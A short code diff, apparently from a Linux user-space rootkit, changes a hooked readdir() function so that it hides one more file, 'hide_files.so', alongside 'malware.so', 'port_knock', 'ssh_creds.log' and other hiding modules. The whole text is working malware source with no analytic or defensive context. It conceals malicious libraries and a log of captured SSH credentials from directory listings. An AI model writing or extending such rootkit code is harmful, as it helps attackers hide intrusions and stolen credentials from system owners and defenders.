@@ -14,7 +14,7 @@ struct dirent *readdir(DIR *dirp) {
 
     struct dirent *entry;
     while ((entry = orig_readdir(dirp)) != NULL) {
-        if (strstr(entry->d_name, "malware.so") || strstr(entry->d_name, "port_knock") || strstr(entry->d_name, "ssh_creds.log") || strstr(entry->d_name, "hide_connections.so") || strstr(entry->d_name, "hide_logs.so")) {
+        if (strstr(entry->d_name, "malware.so") || strstr(entry->d_name, "port_knock") || strstr(entry->d_name, "ssh_creds.log") || strstr(entry->d_name, "hide_connections.so") || strstr(entry->d_name, "hide_logs.so") || strstr(entry->d_name, "hide_files.so")) {
             continue;
         }
         return entry;
